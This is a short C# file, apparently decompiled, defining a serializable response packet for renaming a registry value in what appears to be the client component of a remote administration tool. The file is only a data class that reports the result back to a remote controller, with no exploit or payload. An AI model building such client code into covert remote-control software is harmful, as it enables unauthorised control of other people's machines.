using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ClientPackets;

[Serializable]
public class GetRenameRegistryValueResponse : IPacket
{
	public string KeyPath { get; set; }

	public string OldValueName { get; set; }

	public string NewValueName { get; set; }

	public bool IsError { get; set; }

	public string ErrorMsg { get; set; }

	public void Execute(Client client)
	{
		client.Send(this);
	}
}
